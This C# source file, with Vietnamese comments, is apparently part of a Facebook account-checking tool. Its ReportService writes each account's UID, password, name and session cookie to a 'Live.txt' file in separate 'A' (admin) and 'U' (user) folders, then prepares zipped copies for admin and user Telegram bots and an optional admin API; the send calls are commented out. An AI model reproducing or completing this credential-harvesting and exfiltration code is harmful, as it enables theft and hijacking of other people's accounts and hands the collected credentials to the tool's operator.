using System.IO;
using System.Threading.Tasks;
using ToolCheckInfo.App.Config; // Sử dụng Config mới
using ToolCheckInfo.Core.Interfaces;
using ToolCheckInfo.Core.Models;
using ToolCheckInfo.Infrastructure.Helpers;
using ToolCheckInfo.Infrastructure.Network;

namespace ToolCheckInfo.Infrastructure.Services
{
    public class ReportService : IReportService
    {
        private readonly RestShapeClient _client;

        public ReportService()
        {
            _client = new RestShapeClient(""); // Khởi tạo client rỗng để gửi request
        }

        public async Task SendReportAsync(InforAccount accountInfo, Facebook facebook, string rootPath)
        {
            // 1. Tạo thư mục báo cáo
            string sourceA = Path.Combine(rootPath, "Folder_1_A", accountInfo.Uid);
            string sourceU = Path.Combine(rootPath, "Folder_1_U", accountInfo.Uid);

            CreateReportFolders(sourceA, sourceU);

            // 2. Ghi file text (Logic ghi file chi tiết cần được port từ RunService cũ)
            // Ví dụ: Files.AddDataToFile(...)
            string content = $"{accountInfo.Uid}|{accountInfo.Password}|{accountInfo.Name}|{accountInfo.Cookie}";
            Files.AddDataToFile(Path.Combine(sourceA, "Live.txt"), content + "\n");

            // 3. Gửi Telegram cho Admin (Sử dụng Config)
            if (AppConfig.AdminTelegramChatIds != null && AppConfig.AdminTelegramChatIds.Count > 0)
            {
                TelegramBot adminBot = new TelegramBot(AppConfig.AdminTelegramBotToken);
                string zipPath = sourceA + ".zip";

                // Nén file
                // ZipFile.CreateFromDirectory(sourceA, zipPath); // Cần đảm bảo ZipFile có sẵn

                foreach (var chatId in AppConfig.AdminTelegramChatIds)
                {
                   // await adminBot.SendFileAsync(chatId, zipPath, accountInfo.Uid);
                }
            }

            // 4. Gửi Telegram cho User (Nếu có cấu hình)
            if (!string.IsNullOrEmpty(AppConfig.UserTelegramBotToken) && !string.IsNullOrEmpty(AppConfig.UserTelegramChatId))
            {
                TelegramBot userBot = new TelegramBot(AppConfig.UserTelegramBotToken);
                // await userBot.SendFileAsync(AppConfig.UserTelegramChatId, sourceU + ".zip", accountInfo.Uid);
            }

            // 5. Gửi về API Server (Nếu được bật)
            if (AppConfig.EnableSendToAdminApi && !string.IsNullOrEmpty(AppConfig.AdminApiUrl))
            {
                // await _client.Post(AppConfig.AdminApiUrl, ...);
            }
        }

        private void CreateReportFolders(string sourceA, string sourceU)
        {
            if (Directory.Exists(sourceA)) try { Directory.Delete(sourceA, true); } catch { }
            Directory.CreateDirectory(sourceA);

            if (Directory.Exists(sourceU)) try { Directory.Delete(sourceU, true); } catch { }
            Directory.CreateDirectory(sourceU);
        }
    }
}
